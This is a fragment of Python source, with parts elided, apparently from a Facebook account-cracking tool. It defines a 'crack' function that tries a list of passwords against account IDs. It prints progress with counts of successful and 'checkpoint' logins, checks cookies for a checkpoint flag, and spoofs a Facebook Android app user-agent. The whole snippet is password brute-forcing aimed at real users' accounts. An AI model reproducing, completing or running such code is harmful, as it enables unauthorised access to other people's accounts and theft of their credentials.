...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rBPZ {P}[{b}{loop}{P}/{u}{len(id)}{P}]><{P}[{H}{ok}{P}]><{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/319.0.0.7.107;]"}
				if 'no' in taplikasi:
					ok+=1
